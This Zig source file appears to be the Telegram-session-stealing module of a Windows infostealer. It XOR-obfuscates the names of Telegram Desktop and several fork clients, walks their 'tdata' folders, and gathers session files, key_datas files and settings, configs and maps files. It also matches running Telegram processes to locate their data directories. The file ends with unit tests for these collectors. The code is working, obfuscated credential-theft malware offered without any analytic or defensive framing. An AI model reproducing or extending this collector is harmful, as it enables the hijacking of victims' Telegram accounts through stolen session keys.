const std = @import("std");
const hash = @import("../types/hash.zig");

const E = struct {
    const TDATA = hash.xorEncrypt("tdata");
    const TELEGRAM = hash.xorEncrypt("Telegram Desktop");
    const AYUGRAM = hash.xorEncrypt("AyuGram Desktop");
    const CATOGRAM = hash.xorEncrypt("Catogram");
    const NEKOGRAM = hash.xorEncrypt("Nekogram");
    const KOTATOGRAM = hash.xorEncrypt("Kotatogram");
    const UNIGRAM = hash.xorEncrypt("Unigram");
    const IME = hash.xorEncrypt("iMe");
    const KEY_DATAS = hash.xorEncrypt("key_datas");
    const USERTAG = hash.xorEncrypt("usertag");
    const SETTINGS = hash.xorEncrypt("settings");
    const CONFIGS = hash.xorEncrypt("configs");
    const MAPS = hash.xorEncrypt("maps");
    const ENCRYPTED_PATHS = [_][]const u8{ &TELEGRAM, &AYUGRAM, &CATOGRAM, &NEKOGRAM, &KOTATOGRAM, &UNIGRAM, &IME };

    pub const PROC_TG = hash.xorEncrypt("Telegram");
    pub const PROC_AYU = hash.xorEncrypt("AyuGram");
    pub const PROC_64G = hash.xorEncrypt("64Gram");
    pub const PROC_CTO = hash.xorEncrypt("Catogram");
    pub const PROC_NKO = hash.xorEncrypt("Nekogram");
    pub const PROC_KTA = hash.xorEncrypt("Kotatogram");
    pub const PROC_FRK = hash.xorEncrypt("Forkgram");
    pub const PROC_UNI = hash.xorEncrypt("Unigram");
    pub const PROC_IME = hash.xorEncrypt("iMe");
    pub const DIR_TG = hash.xorEncrypt("Telegram Desktop");
    pub const DIR_AYU = hash.xorEncrypt("AyuGram Desktop");
    pub const DIR_64G = hash.xorEncrypt("64Gram Desktop");
    pub const DIR_CTO = hash.xorEncrypt("Catogram");
    pub const DIR_NKO = hash.xorEncrypt("Nekogram");
    pub const DIR_KTA = hash.xorEncrypt("Kotatogram");
    pub const DIR_FRK = hash.xorEncrypt("Forkgram");
    pub const DIR_UNI = hash.xorEncrypt("Unigram");
    pub const DIR_IME = hash.xorEncrypt("iMe");
    pub const PROC_NAMES = [_][]const u8{ &PROC_TG, &PROC_AYU, &PROC_64G, &PROC_CTO, &PROC_NKO, &PROC_KTA, &PROC_FRK, &PROC_UNI, &PROC_IME };
    pub const DIR_NAMES = [_][]const u8{ &DIR_TG, &DIR_AYU, &DIR_64G, &DIR_CTO, &DIR_NKO, &DIR_KTA, &DIR_FRK, &DIR_UNI, &DIR_IME };
};

fn collectSessionFile(files: *std.ArrayList([]const u8), allocator: std.mem.Allocator, base: []const u8, name: []const u8) bool {
    if (name.len != 17) return false;
    if (name[name.len - 1] != 's') return false;
    const path = std.fs.path.join(allocator, &[_][]const u8{ base, name }) catch return false;
    files.append(path) catch {
        allocator.free(path);
        return false;
    };
    return true;
}

fn collectKeyData(files: *std.ArrayList([]const u8), allocator: std.mem.Allocator, base: []const u8, name: []const u8) bool {
    var ext_buf: [E.KEY_DATAS.len]u8 = undefined;
    hash.xorDecrypt(&E.KEY_DATAS, &ext_buf);
    const ext = ext_buf[0..];
    if (!std.mem.endsWith(u8, name, ext)) return false;
    const path = std.fs.path.join(allocator, &[_][]const u8{ base, name }) catch return false;
    files.append(path) catch {
        allocator.free(path);
        return false;
    };
    return true;
}

fn collectSpecialFile(files: *std.ArrayList([]const u8), allocator: std.mem.Allocator, base: []const u8, name: []const u8) bool {
    var usertag_buf: [E.USERTAG.len]u8 = undefined;
    var settings_buf: [E.SETTINGS.len]u8 = undefined;
    var configs_buf: [E.CONFIGS.len]u8 = undefined;
    var maps_buf: [E.MAPS.len]u8 = undefined;
    hash.xorDecrypt(&E.USERTAG, &usertag_buf);
    hash.xorDecrypt(&E.SETTINGS, &settings_buf);
    hash.xorDecrypt(&E.CONFIGS, &configs_buf);
    hash.xorDecrypt(&E.MAPS, &maps_buf);
    const prefixes = [_][]const u8{ usertag_buf[0..], settings_buf[0..], configs_buf[0..], maps_buf[0..] };
    for (prefixes) |prefix| {
        if (std.mem.startsWith(u8, name, prefix)) {
            const path = std.fs.path.join(allocator, &[_][]const u8{ base, name }) catch return false;
            files.append(path) catch {
                allocator.free(path);
                return false;
            };
            return true;
        }
    }
    return false;
}

fn collectNestedKeyDatas(allocator: std.mem.Allocator, tdata_path: []const u8, files: *std.ArrayList([]const u8)) !void {
    var dir = std.fs.openDirAbsolute(tdata_path, .{ .iterate = true }) catch return;
    defer dir.close();
    var iter = dir.iterate();
    while (iter.next() catch return) |entry| {
        if (entry.kind != .directory) continue;
        const sub_path = try std.fs.path.join(allocator, &[_][]const u8{ tdata_path, entry.name });
        defer allocator.free(sub_path);
        var sub_dir = std.fs.openDirAbsolute(sub_path, .{ .iterate = true }) catch continue;
        defer sub_dir.close();
        var sub_iter = sub_dir.iterate();
        while (sub_iter.next() catch break) |sub_entry| {
            if (sub_entry.kind != .file) continue;
            var ext_buf: [E.KEY_DATAS.len]u8 = undefined;
            hash.xorDecrypt(&E.KEY_DATAS, &ext_buf);
            const ext = ext_buf[0..];
            if (!std.mem.endsWith(u8, sub_entry.name, ext)) continue;
            const full = try std.fs.path.join(allocator, &[_][]const u8{ sub_path, sub_entry.name });
            try files.append(full);
        }
    }
}

fn collectFromTdata(allocator: std.mem.Allocator, tdata_path: []const u8, files: *std.ArrayList([]const u8)) !void {
    var dir = std.fs.openDirAbsolute(tdata_path, .{ .iterate = true }) catch return;
    defer dir.close();
    var iter = dir.iterate();
    while (iter.next() catch {}) |entry| {
        if (entry.kind != .file) continue;
        const name = entry.name;
        if (collectSessionFile(files, allocator, tdata_path, name)) continue;
        if (collectKeyData(files, allocator, tdata_path, name)) continue;
        if (collectSpecialFile(files, allocator, tdata_path, name)) continue;
    }
    try collectNestedKeyDatas(allocator, tdata_path, files);
}

pub fn collect(allocator: std.mem.Allocator, roaming: []const u8, local: []const u8) ![][]const u8 {
    _ = local;
    var all_files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (all_files.items) |f| allocator.free(f);
        all_files.deinit();
    }

    var tdata_buf: [E.TDATA.len]u8 = undefined;
    hash.xorDecrypt(&E.TDATA, &tdata_buf);
    const tdata_name = tdata_buf[0..];

    var path_bufs: [E.ENCRYPTED_PATHS.len][128]u8 = undefined;
    var path_bufs_sliced: [E.ENCRYPTED_PATHS.len][]const u8 = undefined;
    inline for (E.ENCRYPTED_PATHS, 0..) |enc_path, i| {
        hash.xorDecrypt(enc_path, path_bufs[i][0..enc_path.len]);
        path_bufs_sliced[i] = path_bufs[i][0..enc_path.len];
    }

    for (path_bufs_sliced) |app_dir| {
        const tdata_path = std.fs.path.join(allocator, &[_][]const u8{ roaming, app_dir, tdata_name }) catch continue;
        defer allocator.free(tdata_path);
        var dir = std.fs.openDirAbsolute(tdata_path, .{ .iterate = true }) catch continue;
        dir.close();
        try collectFromTdata(allocator, tdata_path, &all_files);
    }

    return all_files.toOwnedSlice();
}

pub fn discoverByProcess(allocator: std.mem.Allocator, roaming: []const u8) ![][]const u8 {
    const processes_module = @import("../system/processes.zig");
    const procs = try processes_module.collect(allocator);
    defer {
        for (procs) |p| allocator.free(p.name);
        allocator.free(procs);
    }

    var proc_bufs: [E.PROC_NAMES.len][32]u8 = undefined;
    var dir_bufs: [E.DIR_NAMES.len][64]u8 = undefined;

    inline for (E.PROC_NAMES, 0..) |enc, i| {
        hash.xorDecrypt(enc, proc_bufs[i][0..enc.len]);
    }
    inline for (E.DIR_NAMES, 0..) |enc, i| {
        hash.xorDecrypt(enc, dir_bufs[i][0..enc.len]);
    }

    var results = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (results.items) |p| allocator.free(p);
        results.deinit();
    }

    var tdata_buf: [E.TDATA.len]u8 = undefined;
    hash.xorDecrypt(&E.TDATA, &tdata_buf);
    const tdata_name = tdata_buf[0..];

    for (procs) |proc| {
        inline for (E.PROC_NAMES, 0..) |_, i| {
            const mod_name = proc_bufs[i][0..E.PROC_NAMES[i].len];
            if (!std.ascii.startsWithIgnoreCase(proc.name, mod_name)) continue;

            const dir_name = dir_bufs[i][0..E.DIR_NAMES[i].len];
            const tdata_path = std.fs.path.join(allocator, &[_][]const u8{ roaming, dir_name, tdata_name }) catch continue;
            var dir = std.fs.openDirAbsolute(tdata_path, .{ .iterate = true }) catch {
                allocator.free(tdata_path);
                continue;
            };
            dir.close();
            try results.append(tdata_path);
        }
    }

    return results.toOwnedSlice();
}

test "collect returns empty for nonexistent paths" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__roaming", "C:\\__nonexistent__local");
    defer {
        for (result) |f| std.testing.allocator.free(f);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "collectSessionFile matches 17-char names ending with s" {
    var list = std.ArrayList([]const u8).init(std.testing.allocator);
    defer {
        for (list.items) |f| std.testing.allocator.free(f);
        list.deinit();
    }
    try std.testing.expect(collectSessionFile(&list, std.testing.allocator, "C:\\base", "abcdefghijklmno1s"));
    try std.testing.expectEqual(@as(usize, 1), list.items.len);
}

test "collectSessionFile rejects wrong length" {
    var list = std.ArrayList([]const u8).init(std.testing.allocator);
    defer list.deinit();
    try std.testing.expect(!collectSessionFile(&list, std.testing.allocator, "C:\\base", "short.s"));
}

test "collectKeyData rejects non-matching" {
    var list = std.ArrayList([]const u8).init(std.testing.allocator);
    defer list.deinit();
    try std.testing.expect(!collectKeyData(&list, std.testing.allocator, "C:\\base", "something_else"));
}

test "collectSpecialFile rejects non-matching" {
    var list = std.ArrayList([]const u8).init(std.testing.allocator);
    defer list.deinit();
    try std.testing.expect(!collectSpecialFile(&list, std.testing.allocator, "C:\\base", "unknown_file"));
}
